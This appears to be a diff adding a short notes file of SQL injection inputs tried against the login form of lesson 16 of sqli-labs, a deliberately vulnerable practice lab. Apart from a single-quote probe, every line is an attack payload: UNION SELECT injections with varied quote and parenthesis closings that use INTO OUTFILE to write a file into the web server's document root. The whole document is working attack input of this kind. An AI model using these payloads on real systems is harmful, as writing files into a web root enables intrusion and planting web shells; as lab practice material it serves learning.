@@ -1,0 +1,12 @@
+User Name:'
+Password:
+User Name:1
+Password:
+User Name:' union select 1,2  into outfile '/var/www/html/sqli-labs/Less-16/u.txt'  #
+Password:
+User Name:" union select 1,2  into outfile '/var/www/html/sqli-labs/Less-16/u.txt' #
+Password:
+User Name:') union select 1,2  into outfile '/var/www/html/sqli-labs/Less-16/u.txt'  #
+Password:
+User Name:") union select 1,2  into outfile '/var/www/html/sqli-labs/Less-16/u.txt' #
+Password:
